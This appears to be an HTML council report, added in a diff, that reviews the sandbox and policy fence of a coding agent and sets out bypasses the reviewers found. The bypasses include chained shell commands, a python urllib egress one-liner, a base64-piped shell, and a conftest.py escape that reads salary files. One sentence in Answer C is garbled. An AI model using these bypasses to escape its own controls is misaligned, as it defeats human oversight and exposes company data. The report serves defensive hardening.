@@ -1,0 +1,444 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Council — boundary review — 2026-10-31</title>
+<style>
+:root {
+  --bg: #f6f7f9;
+  --panel: #ffffff;
+  --fg: #1a1d21;
+  --muted: #5b6572;
+  --line: #d7dde3;
+  --accent: #1f6feb;
+  --code-bg: #eef1f4;
+  --ok: #1a7f37;
+  --warn: #9a6700;
+  --bad: #cf222e;
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg: #0d1117;
+    --panel: #161b22;
+    --fg: #e6edf3;
+    --muted: #9aa4af;
+    --line: #2b333d;
+    --accent: #58a6ff;
+    --code-bg: #11161d;
+    --ok: #3fb950;
+    --warn: #d29922;
+    --bad: #ff7b72;
+  }
+}
+* { box-sizing: border-box; }
+body {
+  margin: 0;
+  background: var(--bg);
+  color: var(--fg);
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  line-height: 1.5;
+}
+main { max-width: 980px; margin: 0 auto; padding: 16px 16px 64px; }
+header.card h1 { margin: 8px 0 12px; font-size: 1.5rem; line-height: 1.25; }
+.card {
+  background: var(--panel);
+  border: 1px solid var(--line);
+  border-radius: 12px;
+  padding: 14px;
+  margin: 14px 0;
+}
+.badge {
+  display: inline-block;
+  padding: 2px 8px;
+  border-radius: 999px;
+  border: 1px solid var(--line);
+  background: var(--code-bg);
+  color: var(--muted);
+  font-size: .75rem;
+  text-transform: uppercase;
+  letter-spacing: .04em;
+}
+.next {
+  border-left: 4px solid var(--accent);
+  padding-left: 10px;
+  margin-bottom: 0;
+}
+details.card > summary {
+  cursor: pointer;
+  font-size: 1rem;
+  padding: 2px 0;
+}
+details.card[open] > summary { margin-bottom: 8px; }
+h2 { font-size: 1.2rem; margin-top: 22px; }
+h3 { font-size: 1.05rem; margin-top: 18px; }
+p { margin: 8px 0; }
+ul, ol { margin: 8px 0 8px 22px; padding: 0; }
+li { margin: 4px 0; }
+blockquote {
+  margin: 10px 0;
+  padding: 4px 12px;
+  border-left: 4px solid var(--line);
+  color: var(--muted);
+}
+pre.code {
+  overflow: auto;
+  background: var(--code-bg);
+  border: 1px solid var(--line);
+  border-radius: 8px;
+  padding: 10px;
+  font-size: .85rem;
+}
+code {
+  background: var(--code-bg);
+  border-radius: 4px;
+  padding: 0 3px;
+  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+}
+pre code { background: none; padding: 0; }
+table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 12px 0;
+  font-size: .86rem;
+}
+th, td {
+  border: 1px solid var(--line);
+  padding: 6px 8px;
+  text-align: left;
+  vertical-align: top;
+}
+th { background: var(--code-bg); }
+.register th:nth-child(1), .register td:nth-child(1) { width: 72px; }
+.register th:nth-child(2), .register td:nth-child(2) { width: 84px; }
+.sev-critical { color: var(--bad); font-weight: 700; }
+.sev-high { color: var(--warn); font-weight: 700; }
+.sev-medium { color: var(--accent); font-weight: 700; }
+footer { color: var(--muted); font-size: .85rem; margin-top: 24px; }
+.path { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+</style>
+</head>
+<body>
+<main>
+
+<header class="card">
+  <div class="badge">Council verdict · boundary</div>
+  <h1>Sound policy fence against the model; not a company guarantee against the operator</h1>
+  <p><strong>Confidence:</strong> Medium-High for code-verified findings; High that the current wording overclaims.</p>
+  <p><strong>Chairman one-liner:</strong> The dispatcher is a sound policy fence against the model and a fiction against the operator — fix the false read claim and the shell capability now, and earn the word “guarantee” only with kernel isolation, egress control, and an off-host audit anchor.</p>
+  <p class="next"><strong>Next action:</strong> Ship the offline adversarial boundary harness and cut the shell interpreter capability; publish literal pass/fail rows before any guarantee language.</p>
+</header>
+
+<section class="card">
+<h2>Issue register</h2>
+<table class="register"><thead><tr><th>ID</th><th>Severity</th><th>Issue</th><th>Evidence</th><th>Fix</th><th>Done when</th><th>Raised by</th></tr></thead><tbody><tr><td>BND-01</td><td><span class="sev-critical">Critical</span></td><td>Nested deny_read bypass through directory tools</td><td>Verified: <code>policy_check(search_from_company_root): None</code>; <code>search_in_files</code> returned <code>apps/chatbot/src/bot.py</code>.</td><td>Enforce deny_read on every returned path and hidden entry; add composition probes with a legitimate in-product control hit.</td><td>A parent-directory search returns zero denied paths and at least one <code>apps/todo/</code> hit.</td><td>B, E; chairman</td></tr><tr><td>BND-02</td><td><span class="sev-critical">Critical</span></td><td>Shell substring allowlist plus <code>shell=True</code>; run_shell not ask-gated</td><td>Verified: composite <code>python3 -m pytest -q; python3 -c ...</code> and <code>git log -p apps/chatbot/...</code> pass <code>policy_check</code>; <code>policy_ask(run_shell): None</code>.</td><td>Remove broad interpreter allow entries, ask-gate shell mutations, or enforce below the process; reject cross-project shell paths.</td><td>The same probes are denied or ask-denied headless, and legitimate pytest calls still work or get a clear approval path.</td><td>A, C, E; reviewers 2/4/5</td></tr><tr><td>BND-03</td><td><span class="sev-high">High</span></td><td>No OS sandbox or network egress control</td><td><code>docs/RELEASE-STATUS.md</code> row: OS sandbox not built.</td><td>Container/microVM plus egress allowlist generated from the same policy.</td><td>The attack harness cannot read outside product or make network calls from inside the execution boundary.</td><td>A, E</td></tr><tr><td>BND-04</td><td><span class="sev-high">High</span></td><td>No active policy means no gate and no audit row</td><td>Verified: <code>policy_check</code> and <code>policy_audit</code> return when policy is <code>None</code>.</td><td>Fail-closed deployment default or explicit opt-in; always-on “fence off” record with resolved environment.</td><td>A run without policy either refuses or emits an unmistakable not-fenced record.</td><td>B, D, E; reviewer 3</td></tr><tr><td>BND-05</td><td><span class="sev-high">High</span></td><td>Managed mode trusts gateway JSON; manifest not verified client-side</td><td>Verified: <code>fetch_policy</code> parses <code>payload[&#x27;policy&#x27;]</code>; no signature verification in path.</td><td>Client-pinned signature verification, or a written statement that the gateway is the trust root.</td><td>A downgraded/unmanaged policy fails before tool use.</td><td>B, C, D</td></tr><tr><td>BND-06</td><td><span class="sev-high">High</span></td><td>Audit is local, incomplete, and not company-held</td><td>Verified: row has no resolved path/cwd/policy hash; rows vanish with no policy; append errors swallowed.</td><td>Always-on audit rows with resolved path, policy hash, and off-host anchor.</td><td>The company can detect downgrade, stop, or missing rows independent of the endpoint.</td><td>R1, R3, R5; chairman</td></tr><tr><td>BND-07</td><td><span class="sev-medium">Medium</span></td><td>Task scope is lexical and over/under-blocks</td><td><code>domain_check</code> self-declares “scope guard, not a security boundary”; substring deny can refuse <code>pytest -k &quot;confirm parser&quot;</code>.</td><td>Keep domain gate as spend/UX, not security; add false-positive probes; separate strict and loose diagnostics.</td><td>No in-scope probe is falsely refused while known off-scope probes are rejected.</td><td>R4; E</td></tr><tr><td>BND-08</td><td><span class="sev-medium">Medium</span></td><td>Plan contract is local approval, not cryptographic signing</td><td>Verified: <code>contract_line = &quot;contract: signed by user&quot;</code>; no key material found.</td><td>Label as local approval; only call it signed after key material exists.</td><td>Docs and UI do not claim external signing without a signature check.</td><td>R2</td></tr><tr><td>BND-09</td><td><span class="sev-medium">Medium</span></td><td>Demo probes assert exact friendly cases; <code>fetch_url</code> does not prove egress control</td><td>Verified: <code>fetch_url</code> is absent from policy allow, so it proves unknown tool rejection, not egress restriction.</td><td>Tighten probe assertions and split “unknown tool” from “network egress.”</td><td>The demo report distinguishes tool allow from egress fence.</td><td>R1, R2</td></tr></tbody></table>
+</section>
+
+<div class="card">
+<h2>Where the council agreed</h2>
+<ul>
+<li>The deterministic gates work for the canonical probed forms: tool allow/deny, realpath containment, fail-closed ask, and scrubbed shell env.</li>
+<li>The shell is the sharp edge: substring families plus <code>shell=True</code> and no egress layer.</li>
+<li>The operator is the root of trust and can bypass the in-process fence.</li>
+<li>Task scope is lexical, not an enforceable boundary.</li>
+</ul>
+<h2>Where it split</h2>
+<ul>
+<li><strong>Order:</strong> capability cuts now vs. OS isolation first. The chairman chose capability cuts now, isolation before the word “guarantee.”</li>
+<li><strong>Demo-blocking:</strong> one advisor treated the shell escape as demo-blocking; others said the demo is fine if labelled. The chairman took the fact and rejected the conclusion: remove or fix the false sentence, do not pretend the live demo is blocked.</li>
+</ul>
+</div>
+
+
+<div class="card">
+<h2>What all five missed</h2>
+<ul>
+<li><strong>No company-held audit anchor:</strong> a locally hash-chained JSONL is still written by the audited party; the company receives nothing.</li>
+<li><strong>Audit cannot distinguish the ungated run:</strong> no policy means no row at all, so “fence off” is invisible.</li>
+<li><strong>Plan “signing” is local approval, not off-host attestation:</strong> the only task control is self-signed.</li>
+<li><strong>Over-blocking:</strong> the same substring deny that blocks `rm ` also blocks `pytest -k "confirm parser"`; no false-positive rate was measured.</li>
+<li><strong>The egress demo probe is vacuous:</strong> `fetch_url` proves unknown tools are rejected, not that egress is controlled.</li>
+</ul>
+</div>
+
+<section class="card">
+<h2>Reviews</h2>
+<table><thead><tr><th>Reviewer</th><th>Strongest</th><th>Biggest blind spot</th><th>Ranking order</th></tr></thead><tbody><tr><td>1</td><td>B</td><td>C</td><td>B &gt; E &gt; C &gt; A &gt; D</td></tr><tr><td>2</td><td>B</td><td>C</td><td>B &gt; E &gt; A &gt; D &gt; C</td></tr><tr><td>3</td><td>B</td><td>C</td><td>B &gt; A &gt; E &gt; C &gt; D</td></tr><tr><td>4</td><td>B</td><td>C</td><td>B &gt; E &gt; A &gt; D &gt; C</td></tr><tr><td>5</td><td>B</td><td>C</td><td>B &gt; E &gt; A &gt; C &gt; D</td></tr></tbody></table>
+</section>
+
+<details class="card">
+<summary><span class="badge">Answer A</span> <strong>expansionist</strong></summary>
+<h2>Council answer — upside-hunting boundary review</h2>
+<p><strong>Threat model [MATERIALS].</strong> Who is trusted: (1) the remote model — <em>not</em> trusted for behavior, only for content; every action is gated locally (<code>agent.py:2984</code> <code>dispatch_tool</code> runs plan gate → dossier gate → policy gate → ask before any tool). (2) The local user — fully trusted by the current design, and that is the load-bearing assumption: they can edit <code>agent.py</code>, the TOML, or point <code>TAMIAS_BASE_URL</code> at a friendly gateway. (3) The local Python process — treated as authoritative today; <code>run_shell</code> executes <code>shell=True</code> with a scrubbed env (<code>agent.py:1251-1258</code>). (4) The gateway — trusted, but the agent never checks the manifest signature (<code>docs/BOUNDED-AGENT.md:146-149</code>); that&#x27;s the gateway&#x27;s job, so a malicious gateway wins by definition. (5) The OS — trusted, i.e., unenforced; RELEASE-STATUS.md:40 admits &quot;OS sandbox: not built, best-effort shell guard only.&quot; Confidence: High.</p>
+<p><strong>The one bypass nobody should kid themselves about [MATERIALS + INFERENCE].</strong> The shell guard is lexical, and the shell allowlist is substring-based (<code>agent.py:2802-2808</code>: <code>pattern in command</code>). Once any allowed family matches, everything after the first <code>;</code> inherits the clearance. Concrete claims:</p>
+<ul>
+<li><code>git status; python3 -c &quot;import urllib.request,os,glob; urllib.request.urlopen(&#x27;http://&#x27;+ ...)&quot;</code> [INFERENCE]: matches an allow family, hits no deny token (<code>http://...</code> doesn&#x27;t start with <code>/</code>), passes <code>shell_escapes_company</code> (lines 1172-1200 scans only literal tokens — no <code>$()</code>, backticks, or runtime-computed paths). Arbitrary egress, arbitrary behavior, all inside the &quot;allowed&quot; family. Confidence: High.</li>
+<li>Data-dependent paths: <code>python3 -c &quot;open(sorted(glob(&#x27;*&#x27;))[0])&quot;</code> never spells <code>../</code> or <code>/etc</code> — the token scan can&#x27;t see it [INFERENCE, High].</li>
+<li>Base64 delegation: <code>git status; echo cm0... | base64 -d | sh</code> contains no denied substring [INFERENCE, High].</li>
+</ul>
+<p>The repo&#x27;s own doc concedes this — <code>BOUNDED-AGENT.md:192-195</code> calls <code>run_shell</code> &quot;the sharp edge.&quot; So the framing question&#x27;s real answer: a <em>company-set</em> boundary <strong>can be exceeded today via the shell tool</strong>, and the honest label is &quot;product-level, best-effort at shell,&quot; not &quot;company guarantee&quot; [OPINION, High].</p>
+<p><strong>Where company / product / task diverge [INFERENCE, Medium].</strong> The policy enforces company (fence) and product (<code>allow_write</code> at toml:53), but <em>task</em> scope is only <code>domain_check</code> (agent.py:2863-2892) — a lexical gate over request text that the code itself calls &quot;a scope guard, not a security boundary&quot; (line 2873-2874). Reads default company-wide; nothing limits the todo agent to one ticket. Nobody mentioned that the model&#x27;s own prompt channel is an exfiltration channel: company code is shipped to OpenRouter by design, and no <code>[network]</code>/host allowlist exists in <code>policies/todoinc-todo.toml</code> even though <code>BOUNDED-AGENT.md:99-101</code> sketches one [FACT from materials, gap unverified in code].</p>
+<p><strong>Test evidence: what&#x27;s proven vs asserted [FACT].</strong> The 374 tests and 17 probes prove the <em>deterministic gates</em> behave (deny wins, realpath, fail-closed ask). They prove almost nothing about <em>adversarial</em> input — every benign probe passes; no mutation, obfuscation, or multi-step escape is in the suite. The live stage repair (RELEASE-STATUS.md:37) remains unproven per the two-pass rule.</p>
+<p><strong>Missing upside — the cheapest wins sitting right here [OPINION, Medium].</strong> (1) This codebase is <em>made</em> for adversarial red-team probes; add ~10 hostile shell probes (delegation, runtime paths, env-expansion, chained after allow-family) to <code>demo/check_boundary.py</code> and publish the failures as documented limits. That converts the current silent gap into the project&#x27;s best sales asset: &quot;here is exactly what our product boundary does <em>not</em> claim.&quot; (2) The audit JSONL (<code>agent.py:2952-2958</code>) is written by the process it audits, with <code>except OSError: pass</code> — a hash-chained row is one afternoon and makes the trail tamper-evident, which companies actually buy.</p>
+<p><strong>Demo-blocking vs production-blocking.</strong> Demo-blocking: nothing — the demo is honest if labeled. Production-blocking: shell escape (any), BYO-gateway (RELEASE-STATUS.md:41), unsigned policy hop.</p>
+<p><strong>Verdict on options: B</strong> [OPINION, High] — the dispatcher is a good policy layer; only the kernel below it can make &quot;people should not be able to bypass that&quot; true.</p>
+<p>One concrete next step (≤1 day): write and run the 10-probe adversarial shell battery offline, record pass/fail in RELEASE-STATUS.md, and relabel the boundary line accordingly.</p>
+<p>One-line verdict: The deterministic gates are genuinely solid; the shell tool is a one-liner bypass away from unrestricted egress, so claim product-level not company-level — and the cheapest upside is weaponizing the known gaps into an adversarial probe suite that proves the boundary&#x27;s honesty.</p>
+</details>
+<details class="card">
+<summary><span class="badge">Answer B</span> <strong>first principles</strong></summary>
+<h2>What is actually being solved</h2>
+<p>Not &quot;which layer to add.&quot; The unasked question is <strong>against whom is the fence drawn?</strong> The option list (A/B/C) presumes the fence is drawn against the <em>model</em> while the <em>local user</em> is inside it. If the fence is meant to bind the employee, options A and B both fail by construction and C fails without client-side pinning.</p>
+<h2>Hidden assumptions, challenged</h2>
+<ol>
+<li><strong>&quot;The policy is an authority.&quot;</strong> It is a TOML file read by the same process the user controls. [FACT] <code>policy_check</code> returns <code>None</code> outright when <code>_ACTIVE_POLICY is None</code> (<code>agent.py:2786-2788</code>), so a run without <code>--policy</code>/<code>--company-id</code> has <strong>no</strong> tool, path, shell, or domain gate at all. Bypass #1 is &quot;don&#x27;t opt in.&quot; [FACT]</li>
+<li><strong>&quot;Managed mode is a company guarantee.&quot;</strong> [FACT] the agent does not verify the manifest signature (<code>docs/BOUNDED-AGENT.md:146-149</code>); <code>docs/RELEASE-STATUS.md:41</code> already concedes &quot;Bring your own gateway bypass possible.&quot; A user points <code>TAMIAS_BASE_URL</code> at any host serving any policy. [INFERENCE, High]</li>
+<li><strong>&quot;deny_read is per-file.&quot;</strong> It is per-<em>argument</em>. [FACT] only <code>trace_feature</code> re-checks each file (<code>agent.py:1769-1771</code>); <code>search_in_files</code> (<code>:1550-1554</code>), <code>investigate_target</code> (<code>:1694</code>), <code>list_directory</code> (<code>:1404</code>), <code>analyze_structure</code> check only the secret name denylist. So <code>search_in_files(&quot;token&quot;, &quot;company/work/todoinc&quot;)</code> reads <code>chatbot/<em>.py</code> and <code>hr/</em>.md</code> — the exact probe #4 the team believes passes. The demo passes because the probe uses the <em>denied path as the argument</em> (<code>demo/check_boundary.py:87-88</code>). [FACT code / INFERENCE exploit, High]</li>
+<li><strong>&quot;Shell families are scoped.&quot;</strong> Deny is substring (<code>agent.py:2804</code>), allow is substring (<code>:2807</code>), executed with <code>shell=True</code> (<code>:1251-1253</code>). <code>python3 -m pytest</code> is an allowed family and pytest executes <code>conftest.py</code> — arbitrary Python with no token scan. <code>python3 -m pytest &gt;/tmp/x</code> also passes <code>shell_escapes_company</code> because the token starts with <code>&gt;</code>, not <code>/</code> (<code>:1193</code>). [INFERENCE, High; unverified by execution]</li>
+<li><strong>&quot;The boundary is the product.&quot;</strong> It is the company. <code>resolve_in_company_workspace</code> fences at <code>company/work/&lt;id&gt;/</code> (<code>:1486</code>); the product fence is <code>allow_write</code> only. [FACT] For <code>todoinc</code>, reads of any other app are legal.</li>
+</ol>
+<h2>Threat model (my read)</h2>
+<p>Trusted: the gateway (only in managed mode, and only by assertion), the local Python process, the OS. Untrusted: the remote model. <strong>The local user is treated as trusted, which is the whole problem.</strong> [OPINION, High]</p>
+<h2>Scope</h2>
+<p>Company ≠ product ≠ task. Company and product diverge on reads (above). Task diverges furthest: <code>domain_check</code> is lexical and self-declared &quot;not a security boundary&quot; (<code>agent.py:2873-2875</code>); the plan gate holds shell to a signature but not to the file list (framed §4). The task boundary is prose. [FACT]</p>
+<h2>Evidence</h2>
+<p>374 tests prove the dispatcher behaves as written for the <em>probed argument forms</em>. They do not prove escape resistance; no test I saw asserts the parent-directory or redirect paths. <code>demo/check_boundary.py</code> &quot;denied-below&quot; accepts <em>any</em> <code>Error:</code> (<code>:115-118</code>) — a weak assertion. [FACT]</p>
+<p><strong>Demo-blocking:</strong> none of the above. <strong>Production-blocking:</strong> (1) opt-out by omission, (2) per-file deny_read, (3) shell <code>shell=True</code>, (4) unpinned gateway.</p>
+<p>The question optimizes the wrong variable (layer count) instead of the trust set. <strong>Option D</strong>: declare the fence anti-model only, then B is proportionate; declare it anti-employee and you need C with client-pinned keys <em>plus</em> B — A is not an option in that world at all.</p>
+<p><strong>One-day step:</strong> add <code>demo/attacks.py</code> — 8 probes expected to <em>succeed</em> today (search from parent, list from parent, <code>&gt;/tmp</code>, conftest pytest, no-policy run, rogue gateway), each xfail-documented in RELEASE-STATUS. Convert the claim from &quot;boundary holds&quot; to a calibrated table in one day.</p>
+<p>One-line verdict: The fence is real against the model and fiction against the user — publish the trust set before adding layers.</p>
+</details>
+<details class="card">
+<summary><span class="badge">Answer C</span> <strong>executor</strong></summary>
+<h2>Executor verdict on the boundary review</h2>
+<p><strong>Trust model — stated as it actually is.</strong> The only hard boundary in this repo is the local Python process (<code>agent.py</code>) checking its own inputs; there is no kernel, container, or signed-layer enforcement anywhere [FACT: <code>docs/RELEASE-STATUS.md</code> &quot;What is blocked&quot; — OS sandbox not built, client-pinned manifest not built]. So: local user = root of trust (can edit <code>agent.py</code>, dropping every gate); local process = enforcement point and trusted; remote model = fully untrusted, correctly treated so; gateway = trusted, but the agent never verifies the manifest signature itself (<code>BOUNDED-AGENT.md</code> §&quot;Managed mode&quot;; <code>fetch_policy</code>, agent.py:2698–2723, trusts whatever JSON arrives). Confidence: High.</p>
+<p><strong>Enforcement per layer.</strong> Tool allowlist, shell family rules, allow_write/deny_read globs, ask-fail-closed, realpath containment — all real and per-action, gated at the top of <code>dispatch_tool</code> (agent.py:2984–3024); deny wins; headless ask denies [FACT: code cited]. Investigation tools are correctly inside <code>READ_TOOLS</code>/<code>PATH_ARG</code> (agent.py:2477–2494) [FACT]. Confidence: High.</p>
+<p><strong>Bypasses I can name concretely:</strong></p>
+<ol>
+<li><strong>Composite shell commands defeat the substring allowlist.</strong> <code>shell_allow</code> matching is <code>any(pattern in command)</code> (agent.py:2807) and the path guard only scans whitespace tokens for absolute/<code>..</code>/<code>~</code> escapes (agent.py:1172–1200). So <code>python3 -m pytest -q &amp;&amp; python3 -c &quot;print(open(&#x27;company/work/todoinc/hr/salaries.csv&#x27;).read())&quot;</code> passes the allow family, passes the path guard (relative path inside cwd), and executes arbitrary Python under the company cwd [INFERENCE from code, unverified by running it — but the repo itself concedes this: <code>BOUNDED-AGENT.md</code> &quot;Honest limits&quot;: &quot;a determined prompt-injected command can still find unguarded operators&quot;]. Arbitrary Python then reaches the network — there is <strong>no egress layer at all</strong> (no <code>[network]</code> handling exists in the loader, agent.py:2517–2574, versus the design&#x27;s promise in <code>BOUNDED-AGENT.md</code> §3).&quot;— wait, <code>[design&#x27;s promise🗂 in §4 example]. Confidence: High on the gap; the exact payload is &quot;plausible, unverified.&quot;</code></li>
+<li><strong>Audit is appendable, not integral.</strong> The audit file (<code>policies/todoinc-todo.audit.jsonl</code>) is not in <code>PROTECTED_PATHS</code> (only the policy file is protected at agent.py:4699), and an allowed composite command can append forged rows [INFERENCE]. Confidence: Medium.</li>
+<li><strong>Plan gate is file-list only for writes; shell is signature-gated but not path-scoped</strong> — the framed-question itself states this; code confirms (<code>plan_write_block</code> agent.py:2306 only checks <code>WRITE_TOOLS</code>). Confidence: High.</li>
+<li><strong><code>--unbounded</code> / running from a checkout</strong>: enforcement is opt-in via flags and default-path deployment policy (agent.py:4710–4738) — good default, but whoever runs <code>--unbounded</code> has no fence [FACT].</li>
+<li><strong><code>demo/check_boundary.py</code> wires the fences by hand rather than through <code>main()</code></strong> (lines 51–58) — an honest probe, but it tests the setup the demo assumes, not the production startup path [MATERIALS].</li>
+</ol>
+<p><strong>Company vs product vs task.</strong> The fence is company+product (company/workspace + allow_write globs). It is <strong>not task-scoped</strong>: nothing marks &quot;this run&#x27;s task,&quot; and the plan contract is the only task scoping, and it doesn&#x27;t cover shell paths. Divergence point: product scope is granted, task scope is only advisory. Confidence: High.</p>
+<p><strong>Test evidence.</strong> 374 passing tests and offline probes are real [MATERIALS], but they prove the gates deny the <em>canonical</em> probes. They do not prove: composite-command safety (no such probe), network restriction (none exists), or live-model behavior (latest live run 0/2, rate-limited — <code>RELEASE-STATUS.md</code>). Demo-blocking: none — the honest posture is fine for a demo. Production-blocking: shell escape (1), egress (none), agent-signature gap / bring-your-own-gateway (option C territory).</p>
+<p><strong>Monday morning, one working day:</strong> add three composite-command probes to <code>demo/check_boundary.py</code> (pytest+<code>python3 -c</code>, pytest+<code>&amp;&amp;</code> redirect into the audit file, <code>git status</code> + redirect) and confirm they are denied; where not, tighten <code>run_shell</code> to reject any command containing a second shell operator (<code>;</code>, <code>&amp;&amp;</code>, <code>|</code>, backticks, <code>&gt;</code>) — one regex in <code>shell_escapes_company</code>, offline-testable.</p>
+<p><strong>Two-week sequence:</strong> (1) day 1 probes + operator filter; (2) days 2–4: implement the <code>[network]</code> egress stub fail-closed in managed mode via gateway-side key scoping; (3) week 2: run the two-consecutive-passes live gate after the changes, and add audit-path <code>protect_path</code>. <strong>Deliberately not yet:</strong> OS/container isolation (option B) and the client-pinned manifest (option C) — real work, but they don&#x27;t block the offline demo and would be built on an unfixed shell layer.</p>
+<p>One-line verdict: The in-process fence is real and per-action but shell composite commands and the absent egress layer let the product/company boundary be exceeded, so tighten <code>run_shell</code> first and label the rest honestly rather than claim a company guarantee today.</p>
+</details>
+<details class="card">
+<summary><span class="badge">Answer D</span> <strong>outsider</strong></summary>
+<p><strong>What I do not understand as a newcomer.</strong> The demo&#x27;s core nouns — &quot;dossier&quot;, &quot;plan contract&quot;, &quot;checkpoint&quot;, &quot;boundary card&quot;, &quot;managed mode&quot;, &quot;company fence&quot; — are never defined in plain language for a buyer; I had to read <code>agent.py</code> to know what is being guaranteed. [MATERIALS] That itself is a presentation risk.</p>
+<p><strong>Threat model.</strong> The remote model is distrusted: <code>domain_check</code> runs before spend (agent.py:2863) and the policy gate sits inside <code>dispatch_tool</code> (agent.py:3000-3002). The OS and the local user are fully trusted: <code>run_shell</code> is <code>subprocess.run(shell=True)</code> as the invoking user (agent.py:1251-1259). Critically, with no active policy <code>policy_check</code> returns <code>None</code> (agent.py:2786-2788), so tool allowlist, <code>deny_read</code>, <code>allow_write</code> are all silently off; the user picks the policy path via <code>--policy</code> and can edit or delete it, or edit <code>agent.py</code>. Confidence: High. So the user&#x27;s ask — &quot;people should not be able to bypass that&quot; — is <strong>not met</strong> for the local employee under Options A or B; only managed mode narrows it, and even there the agent does not verify the manifest signature (BOUNDED-AGENT.md:149) and the client-pinned manifest is &quot;Not built — &#x27;Bring your own gateway&#x27; bypass possible&quot; (RELEASE-STATUS:41).</p>
+<p><strong>Enforcement layers.</strong> Order: plan gate → dossier gate → policy gate (tool deny wins, read-only, shell families, path globs) → ask (headless = deny, agent.py:3004-3010) → checkpoint → tool. Tools re-resolve realpath containment internally (agent.py:1345-1358, 1457-1488) — genuine defence in depth, High confidence. Investigation tools are in <code>READ_TOOLS</code>/<code>PATH_ARG</code> (agent.py:2477-2494), so <code>deny_read</code> covers them at the policy layer. But <code>search_in_files</code> reads a directory tree: a denied path nested under an allowed root is not skipped per file. Audit rows are appended and bodies redacted, but append failures are swallowed (agent.py:2956-2958) and the JSONL is a local, forgeable file.</p>
+<p><strong>Bypasses.</strong></p>
+<ol>
+<li><strong>Interpreter escape (the big one).</strong> <code>python3 -m pytest</code> is an allowed shell family (policy:30) and executes repo code; a model-written <code>conftest.py</code> inside the product runs with full user privileges — readable: <code>hr/</code>, <code>.env</code>, network, any write path. The shell guard only token-scans the command <em>string</em> (agent.py:1172-1219). BOUNDED-AGENT.md &quot;Honest limits&quot; admits this. [MATERIALS+INFERENCE] High confidence; untested — no probe exists.</li>
+<li><strong>Substring family gate.</strong> Any command <em>containing</em> &quot;git status&quot; passes allow (agent.py:2807); only literal &quot;rm &quot;, &quot;curl &quot; etc. are denied.</li>
+<li><strong>Network.</strong> No egress layer exists; the shipped policy has no <code>[network]</code> block — that section is only in the proposal template (BOUNDED-AGENT.md:99-102).</li>
+<li><strong>Plan/dossier.</strong> Shell is signature-gated but not path-scoped by the signed file list (framed-question #9).</li>
+</ol>
+<p><strong>Scope divergence.</strong> Task = lexical <code>domain_check</code>, whose own docstring says &quot;scope guard, not a security boundary&quot; and is trivially satisfied by &quot;item&quot;/&quot;task&quot; (agent.py:2873). Product = <code>allow_write</code> globs. Company = realpath fence <em>and</em> shell cwd — so shell runs company-wide, not product-wide. Three scopes, one demo card.</p>
+<p><strong>Test evidence.</strong> Proven: 374 offline tests and 17 deterministic probes refuse the exact listed strings (demo/check_boundary.py; RELEASE-STATUS:52). Only asserted: real-model behaviour — latest live run 0/2 rate-limited (RELEASE-STATUS:37) — and any adversarial-shell behaviour, which no probe covers.</p>
+<p><strong>Blocking.</strong> Demo-blocking: none if everything is labelled offline and the phrase &quot;company guarantee&quot; is dropped. Production-blocking: OS sandbox, egress control, verified/pinned manifest or gateway-side execution, the pytest/conftest escape, audit integrity, and a written threat model stating the local user is trusted. [OPINION] Medium-High.</p>
+<p><strong>Next step (one day).</strong> Add <code>demo/redteam_boundary.py</code>: ~10 adversarial shell strings (<code>echo x; git status</code>, <code>git status; ls ../hr</code>, conftest execution) through <code>dispatch_tool</code>, recording honest fails; anchor the shell allow gate to whole-command prefix match.</p>
+<p>One-line verdict: The boundary honestly fences a well-meaning model offline; it is not yet a company guarantee against the local user, the network, or an allowed-interpreter escape — say so, then add OS/egress isolation before claiming more.</p>
+</details>
+<details class="card">
+<summary><span class="badge">Answer E</span> <strong>contrarian</strong></summary>
+<p><strong>Contrarian / boundary review — what fails anyway</strong></p>
+<p><strong>1. The shell is the boundary&#x27;s open door, and the policy itself invites the model through it.</strong> [FACT] The policy (<code>policies/todoinc-todo.toml</code> §[run_shell]) allows <code>python3 -m pytest</code>, and <code>run_shell</code> is <em>not</em> in <code>[tools] ask</code> (only <code>write_file</code>, <code>edit_file</code>, <code>create_directory</code> are, §[tools]). [INFERENCE, unverified] pytest imports <code>conftest.py</code> from cwd; one ask-approved product write plants one, and one &quot;allowed&quot; <code>python3 -m pytest</code> command executes arbitrary Python — reading <code>hr/salaries.csv</code>, rewriting the policy, opening symlinks, spawning <code>curl</code>. <code>shell_escapes_company</code> (<code>agent.py:1172-1200</code>) only token-scans for <code>~</code>, <code>..</code>, and absolute paths; its own docstring says &quot;Shell cannot be fully sandboxed from pure Python … best-effort.&quot; <code>BOUNDED-AGENT.md</code> &quot;Honest limits&quot; concedes the same. The company guarantee is therefore anchored to a single human &quot;yes&quot; that the demo is <em>designed</em> to elicit. Confidence: High.</p>
+<p><strong>2. Cross-project reads survive the guard, likely never probed.</strong> [INFERENCE, unverified] From <code>cwd=company/work/todoinc/</code>, <code>git log -p apps/chatbot/&lt;file&gt;</code> contains an allowed substring, no absolute path, no <code>..</code> — the token scanner passes it, and git resolves the relative path against cwd into another project. The 12-probe list in the framed question tests only direct <code>hr/salaries.csv</code> style reads, per <code>demo/check_boundary.py</code> §probes. Confidence: Medium.</p>
+<p><strong>3. The company fence is operator-owned.</strong> [FACT] With <code>--company-id</code> absent, <code>resolve_in_company_workspace()</code> explicitly degrades to the workspace fence (<code>agent.py:1473-1478</code>, which documents the <em>prior</em> bug: &quot;they were an unfenced read primitive&quot;). One omitted CLI flag and the company wall collapses; nothing fails closed on that locally. Confidence: High.</p>
